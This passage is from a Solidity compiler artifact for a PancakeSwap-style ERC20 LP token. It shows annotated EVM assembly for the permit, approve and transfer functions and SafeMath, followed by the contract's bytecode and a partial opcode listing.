sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":4073:4086  nonces[owner] */\n      dup1\n      dup10\n      and\n        /* \"ERC20.sol\":3734:3748  bytes32 digest */\n      0x00\n        /* \"ERC20.sol\":4073:4086  nonces[owner] */\n      dup2\n      dup2\n      mstore\n        /* \"ERC20.sol\":4073:4079  nonces */\n      0x05\n        /* \"ERC20.sol\":4073:4086  nonces[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":4073:4088  nonces[owner]++ */\n      dup1\n      sload\n      0x01\n      dup1\n      dup3\n      add\n      swap1\n      swap3\n      sstore\n        /* \"ERC20.sol\":3901:4144  abi.encode(... */\n      dup3\n      mload\n        /* \"ERC20.sol\":706:772  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"ERC20.sol\":3901:4144  abi.encode(... */\n      dup2\n      dup7\n      add\n      mstore\n      dup1\n      dup5\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      swap6\n      dup14\n      and\n      0x60\n      dup7\n      add\n      mstore\n      0x80\n      dup6\n      add\n      dup13\n      swap1\n      mstore\n      0xa0\n      dup6\n      add\n      swap6\n      swap1\n      swap6\n      mstore\n      0xc0\n      dup1\n      dup6\n      add\n      dup12\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup7\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"ERC20.sol\":3901:4144  abi.encode(... */\n      0xe0\n      dup6\n      add\n      dup3\n      mstore\n        /* \"ERC20.sol\":3870:4162  keccak256(... */\n      dup1\n      mload\n      swap1\n      dup4\n      add\n      keccak256\n      shl(0xf0, 0x1901)\n        /* \"ERC20.sol\":3774:4176  abi.encodePacked(... */\n      0x0100\n      dup7\n      add\n      mstore\n      0x0102\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      0x0122\n      dup1\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      dup1\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup6\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap7\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup7\n      mstore\n        /* \"ERC20.sol\":3774:4176  abi.encodePacked(... */\n      0x0142\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n        /* \"ERC20.sol\":3751:4186  keccak256(... */\n      dup7\n      mload\n      swap7\n      dup4\n      add\n      swap7\n      swap1\n      swap7\n      keccak256\n        /* \"ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      swap6\n      dup4\n      swap1\n      mstore\n      0x0162\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n      dup7\n      swap1\n      mstore\n      0xff\n      dup10\n      and\n      0x0182\n      dup6\n      add\n      mstore\n      0x01a2\n      dup5\n      add\n      dup9\n      swap1\n      mstore\n      0x01c2\n      dup5\n      add\n      dup8\n      swap1\n      mstore\n      mload\n        /* \"ERC20.sol\":3734:3748  bytes32 digest */\n      swap2\n      swap4\n        /* \"ERC20.sol\":4073:4088  nonces[owner]++ */\n      swap3\n        /* \"ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      0x01e2\n      dup1\n      dup3\n      add\n      swap4\n      not(0x1f)\n      dup2\n      add\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n        /* \"ERC20.sol\":4073:4088  nonces[owner]++ */\n      dup6\n        /* \"ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_77\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_77:\n      pop\n      pop\n        /* \"ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      mload(add(not(0x1f), mload(0x40)))\n      swap2\n      pop\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":4280:4310  recoveredAddress != address(0) */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"ERC20.sol\":4280:4339  recoveredAddress != address(0) && recoveredAddress == owner */\n      tag_78\n      jumpi\n      pop\n        /* \"ERC20.sol\":4334:4339  owner */\n      dup9\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":4314:4339  recoveredAddress == owner */\n      and\n        /* \"ERC20.sol\":4314:4330  recoveredAddress */\n      dup2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":4314:4339  recoveredAddress == owner */\n      and\n      eq\n        /* \"ERC20.sol\":4280:4339  recoveredAddress != address(0) && recoveredAddress == owner */\n    tag_78:\n        /* \"ERC20.sol\":4259:4391  require(... */\n      tag_79\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1a\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e56414c49445f5349474e4154555245000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_79:\n        /* \"ERC20.sol\":4401:4432  _approve(owner, spender, value) */\n      tag_80\n        /* \"ERC20.sol\":4410:4415  owner */\n      dup10\n        /* \"ERC20.sol\":4417:4424  spender */\n      dup10\n        /* \"ERC20.sol\":4426:4431  value */\n      dup10\n        /* \"ERC20.sol\":4401:4409  _approve */\n      tag_66\n        /* \"ERC20.sol\":4401:4432  _approve(owner, spender, value) */\n      jump\t// in\n    tag_80:\n        /* \"ERC20.sol\":3475:4439  function permit(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n    tag_63:\n      0x02\n      0x20\n      swap1\n      dup2\n      mstore\n      0x00\n      swap3\n      dup4\n      mstore\n      0x40\n      dup1\n      dup5\n      keccak256\n      swap1\n      swap2\n      mstore\n      swap1\n      dup3\n      mstore\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":2410:2579  function _approve(address owner, address spender, uint256 value) private {... */\n    tag_66:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2493:2509  allowance[owner] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"ERC20.sol\":2493:2502  allowance */\n      0x02\n        /* \"ERC20.sol\":2493:2509  allowance[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":2493:2518  allowance[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"ERC20.sol\":2493:2526  allowance[owner][spender] = value */\n      dup6\n      swap1\n      sstore\n        /* \"ERC20.sol\":2541:2572  Approval(owner, spender, value) */\n      dup2\n      mload\n      dup6\n      dup2\n      mstore\n      swap2\n      mload\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"ERC20.sol\":2410:2579  function _approve(address owner, address spender, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"SafeMath.sol\":339:475  function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_70:\n        /* \"SafeMath.sol\":431:436  x - y */\n      dup1\n      dup3\n      sub\n        /* \"SafeMath.sol\":426:442  (z = x - y) <= x */\n      dup3\n      dup2\n      gt\n      iszero\n        /* \"SafeMath.sol\":418:468  require((z = x - y) <= x, \"ds-math-sub-underflow\") */\n      tag_64\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x15\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x58, 0x64732d6d6174682d7375622d756e646572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"ERC20.sol\":2585:2804  function _transfer(address from, address to, uint256 value) private {... */\n    tag_72:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2681:2696  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":2681:2690  balanceOf */\n      0x01\n        /* \"ERC20.sol\":2681:2696  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      tag_85\n      swap1\n        /* \"ERC20.sol\":2701:2706  value */\n      dup3\n        /* \"ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"ERC20.sol\":2681:2700  balanceOf[from].sub */\n      tag_70\n        /* \"ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_85:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2663:2678  balanceOf[from] */\n      dup1\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":2663:2672  balanceOf */\n      0x01\n        /* \"ERC20.sol\":2663:2678  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup1\n      dup3\n      keccak256\n        /* \"ERC20.sol\":2663:2707  balanceOf[from] = balanceOf[from].sub(value) */\n      swap4\n      swap1\n      swap4\n      sstore\n        /* \"ERC20.sol\":2733:2746  balanceOf[to] */\n      swap1\n      dup5\n      and\n      dup2\n      mstore\n      keccak256\n      sload\n        /* \"ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      tag_86\n      swap1\n        /* \"ERC20.sol\":2751:2756  value */\n      dup3\n        /* \"ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      0xffffffff\n        /* \"ERC20.sol\":2733:2750  balanceOf[to].add */\n      tag_87\n        /* \"ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_86:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2717:2730  balanceOf[to] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"ERC20.sol\":2717:2726  balanceOf */\n      0x01\n        /* \"ERC20.sol\":2717:2730  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"ERC20.sol\":2717:2757  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"ERC20.sol\":2772:2797  Transfer(from, to, value) */\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"ERC20.sol\":2717:2730  balanceOf[to] */\n      swap2\n      swap4\n        /* \"ERC20.sol\":2772:2797  Transfer(from, to, value) */\n      swap3\n      dup8\n      and\n      swap3\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n      swap3\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log3\n        /* \"ERC20.sol\":2585:2804  function _transfer(address from, address to, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"SafeMath.sol\":198:333  function add(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_87:\n        /* \"SafeMath.sol\":290:295  x + y */\n      dup1\n      dup3\n      add\n        /* \"SafeMath.sol\":285:301  (z = x + y) >= x */\n      dup3\n      dup2\n      lt\n      iszero\n        /* \"SafeMath.sol\":277:326  require((z = x + y) >= x, \"ds-math-add-overflow\") */\n      tag_64\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6164642d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n\n    auxdata: 0xa265627a7a7231582000d3a072e2b19d1942fd6ff86893a1396bba021b0fb0958be6ff3a10da49b7d464736f6c63430005100032\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b5060405146908060526109b7823960408051918290036052018220828201825260078352664b4243204c507360c81b6020938401528151808301835260018152603160f81b908401528151808401919091527f6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe818301527fc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6606082015260808101949094523060a0808601919091528151808603909101815260c090940190528251920191909120600455506108cc806100eb6000396000f3fe608060405234801561001057600080fd5b50600436106100ea5760003560e01c806347d5d8561161008c57806395d89b411161006657806395d89b411461029c578063a9059cbb146102a4578063d505accf146102d0578063dd62ed3e14610323576100ea565b806347d5d8561461022a57806370a08231146102505780637ecebe0014610276576100ea565b806323b872dd116100c857806323b872dd146101c657806330adf81f146101fc578063313ce567146102045780633644e51514610222576100ea565b806306fdde03146100ef578063095ea7b31461016c57806318160ddd146101ac575b600080fd5b6100f7610351565b6040805160208082528351818301528351919283929083019185019080838360005b83811015610131578181015183820152602001610119565b50505050905090810190601f16801561015e5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101986004803603604081101561018257600080fd5b506001600160a01b038135169060200135610374565b604080519115158252519081900360200190f35b6101b461038b565b60408051918252519081900360200190f35b610198600480360360608110156101dc57600080fd5b506001600160a01b03813581169160208101359091169060400135610391565b6101b461042b565b61020c61044f565b6040805160ff9092168252519081900360200190f35b6101b4610454565b6101b46004803603602081101561024057600080fd5b50356001600160a01b031661045a565b6101b46004803603602081101561026657600080fd5b50356001600160a01b031661046c565b6101b46004803603602081101561028c57600080fd5b50356001600160a01b031661047e565b6100f7610490565b610198600480360360408110156102ba57600080fd5b506001600160a01b0381351690602001356104b2565b610321600480360360e08110156102e657600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c001356104bf565b005b6101b46004803603604081101561033957600080fd5b506001600160a01b03813581169160200135166106bf565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b60006103813384846106dc565b5060015b92915050565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610416576001600160a01b03841660009081526002602090815260408083203384529091529020546103f1908363ffffffff61073e16565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b61042184848461078e565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b60016020526000908152604090205481565b60056020526000908152604090205481565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b600061038133848461078e565b42841015610507576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa158015610622573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906106585750886001600160a01b0316816001600160a01b0316145b6106a9576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b6106b48989896106dc565b505050505050505050565b600260209081526000928352604080842090915290825290205481565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b80820382811115610385576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160a01b0383166000908152600160205260409020546107b7908263ffffffff61073e16565b6001600160a01b0380851660009081526001602052604080822093909355908416815220546107ec908263ffffffff61084816565b6001600160a01b0380841660008181526001602090815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b80820182811015610385576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfea265627a7a7231582000d3a072e2b19d1942fd6ff86893a1396bba021b0fb0958be6ff3a10da49b7d464736f6c63430005100032454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD CHAINID SWAP1 DUP1 PUSH1 0x52 PUSH2 0x9B7 DUP3 CODECOPY PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB PUSH1 0x52 ADD DUP3 KECCAK256 DUP3 DUP3 ADD DUP3 MSTORE PUSH1 0x7 DUP4 MSTORE PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL PUSH1 0x20 SWAP4 DUP5 ADD MSTORE DUP2 MLOAD DUP1 DUP4 ADD DUP4 MSTORE PUSH1 0x1 DUP2 MSTORE PUSH1 0x31 PUSH1 0xF8 SHL SWAP1 DUP5 ADD MSTORE DUP2 MLOAD DUP1 DUP5 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH32 0x6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE DUP2 DUP4 ADD MSTORE PUSH32 0xC89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6 PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x80 DUP2 ADD SWAP5 SWAP1 SWAP5 MSTORE ADDRESS PUSH1 0xA0 DUP1 DUP7 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xC0 SWAP1 SWAP5 ADD SWAP1 MSTORE DUP3 MLOAD SWAP3 ADD SWAP2 SWAP1 SWAP2 KECCAK256 PUSH1 0x4 SSTORE POP PUSH2 0x8CC DUP1 PUSH2 0xEB PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xEA JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x47D5D856 GT PUSH2 0x8C JUMPI DUP1 PUSH4 0x95D89B41 GT PUSH2 0x66 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x29C JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x2A4 JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x2D0 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x323 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x22A JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x250 JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x276 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0xC8 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1C6 JUMPI DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x1FC JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x204 JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x222 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xEF JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x16C JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x1AC JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xF7 PUSH2 0x351 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x131 JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x119 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x15E JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x182 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x374 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x38B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1DC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0x391 JUMP JUMPDEST PUSH2 0x1B4 PUSH2 0x42B JUMP JUMPDEST PUSH2 0x20C PUSH2 0x44F JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x454 JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x240 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x45A JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x266 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x46C JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x28C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x47E JUMP JUMPDEST PUSH2 0xF7 PUSH2 0x490 JUMP JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x2BA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x4B2 JUMP JUMPDEST PUSH2 0x321 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x2E6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x4BF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x339 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x6BF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x381 CALLER DUP5 DUP5 PUSH2 0x6DC JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0x416 JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0x3F1 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x73E AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0x421 DUP5 DUP5 DUP5 PUSH2 0x78E JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 